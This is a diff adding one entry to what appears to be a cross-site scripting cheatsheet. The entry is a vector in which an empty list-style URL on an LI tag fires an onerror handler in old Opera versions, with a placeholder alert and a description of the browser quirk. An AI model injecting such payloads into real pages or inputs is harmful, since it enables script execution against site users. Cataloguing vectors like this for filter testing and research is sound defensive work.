@@ -1239,5 +1239,34 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'plaintext', 'tags', 'parsing', 'attributes'],
         'reporter'   : 'LeverOne'
+    }},
+    { /* ID 41 - Error handler via empty list-style  */
+        'id'         : 41,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'Error handler via empty list-style',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<li style=list-style:url() onerror=%js_alert%>',
+        'description': {
+            'en' : 'Opera 10.5 and earlier versions fire an error event for <LI> tags in case the background URL via style attribute cannot be loaded. The same works with "list-style-image" too. On Opera 10.10 and earlier more tag/style combinations like this work as well.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'tickets'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },            
+        'browsers'   : {
+            'opera': ['8.x', '9.x', '10.x'], 
+        },
+        'tags'       : ['xss', 'javascript', 'plaintext', 'tags', 'parsing', 'attributes'],
+        'reporter'   : 'LeverOne, .mario'
     }
 ]
